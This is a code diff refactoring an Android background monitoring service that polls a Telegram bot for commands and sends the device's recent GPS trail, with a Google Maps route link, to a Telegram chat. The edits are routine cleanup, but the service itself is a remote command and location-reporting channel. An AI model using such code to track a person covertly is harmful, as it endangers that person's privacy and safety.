@@ -1148,6 +1148,10 @@ class MonitoringService : Service() {
 
 
 
+    private fun updatesUrl(token: String, offset: Long): String {
+        return "https://api.telegram.org/bot$token/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22channel_post%22,%22edited_channel_post%22,%22callback_query%22%5D"
+    }
+
     private suspend fun pollTelegramCommands(): Boolean {
         if (android.os.SystemClock.elapsedRealtime() < commandBackoffUntil) return false
         if (NetworkUtils.isPollBlocked(preferencesManager)) return false
@@ -1160,7 +1164,7 @@ class MonitoringService : Service() {
         if (botToken.isEmpty() || chatId.isEmpty()) return false
 
         val offset = preferencesManager.lastUpdateId + 1
-        val url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22channel_post%22,%22edited_channel_post%22,%22callback_query%22%5D"
+        val url = updatesUrl(botToken, offset)
 
         var response = try {
             TelegramClient.api.getUpdates(url)
@@ -1176,7 +1180,7 @@ class MonitoringService : Service() {
             }
             val (freshToken, freshChat) = sendCreds()
             if (freshToken.isNotEmpty() && (freshToken != botToken || freshChat != chatId)) {
-                val retryUrl = "https://api.telegram.org/bot$freshToken/getUpdates?offset=$offset&timeout=30&limit=50&allowed_updates=%5B%22message%22,%22edited_message%22,%22channel_post%22,%22edited_channel_post%22,%22callback_query%22%5D"
+                val retryUrl = updatesUrl(freshToken, offset)
                 response = try {
                     TelegramClient.api.getUpdates(retryUrl)
                 } catch (e: kotlinx.coroutines.CancellationException) {
@@ -1200,18 +1204,13 @@ class MonitoringService : Service() {
         }
         if (response.code() == 409) {
             val now409 = android.os.SystemClock.elapsedRealtime()
-            val selfConflict = try {
-                now409 - lastLoopRestartAt < 60_000L
-            } catch (_: Exception) {
-                false
-            }
+            val selfConflict = now409 - lastLoopRestartAt < 60_000L
             android.util.Log.w("MonitoringService", "getUpdates conflict: another consumer is polling, backing off")
-            commandBackoffUntil = android.os.SystemClock.elapsedRealtime() + (if (selfConflict) 60_000L else 300_000L)
+            commandBackoffUntil = now409 + (if (selfConflict) 60_000L else 300_000L)
             idlePolls = 4
             try {
                 val nowConflict = System.currentTimeMillis()
-                val quietRestart = try { now409 - lastLoopRestartAt < 60_000L } catch (_: Exception) { false }
-                if (!quietRestart && nowConflict - updateConflictNoticeAt > 3_600_000L) {
+                if (!selfConflict && nowConflict - updateConflictNoticeAt > 3_600_000L) {
                     updateConflictNoticeAt = nowConflict
                     serviceScope.launch {
                         sendToTelegram("Konflik polling bot (409): klien lain sedang membaca pembaruan, perintah tertunda. Hentikan klien polling lain.")
@@ -2569,12 +2568,13 @@ class MonitoringService : Service() {
                 if (trail.isEmpty()) {
                     sendToTelegram("👣 Jejak kosong. Lokasi tercatat tiap patroli/perintah lokasi.")
                 } else {
+                    val last = trail.takeLast(10)
                     sendToTelegram(buildString {
-                        appendLine("👣 <b>Jejak (${trail.size} titik, 10 terakhir)</b>")
-                        for ((ts, la, lo) in trail.takeLast(10)) {
+                        appendLine("👣 <b>Jejak (${trail.size} titik tersimpan, ${last.size} terakhir)</b>")
+                        for ((ts, la, lo) in last) {
                             appendLine("${TimeFmt.short(ts)} — $la,$lo")
                         }
-                        append("https://www.google.com/maps/dir/" + trail.takeLast(10).joinToString("/") { "${it.second},${it.third}" })
+                        append("https://www.google.com/maps/dir/" + last.joinToString("/") { "${it.second},${it.third}" })
                     })
                 }
             }
@@ -4240,7 +4240,7 @@ class MonitoringService : Service() {
                 val la = ll[0].toLongOrNull() ?: return@mapNotNull null
                 val lo = ll[1].toLongOrNull() ?: return@mapNotNull null
                 Triple(ts, la / 1_000_000.0, lo / 1_000_000.0)
-            }.filter { it.first > System.currentTimeMillis() - 24 * 60 * 60_000L }.takeLast(24)
+            }.filter { it.first > System.currentTimeMillis() - 24 * 60 * 60_000L }
         } catch (_: Exception) {
             emptyList()
         }
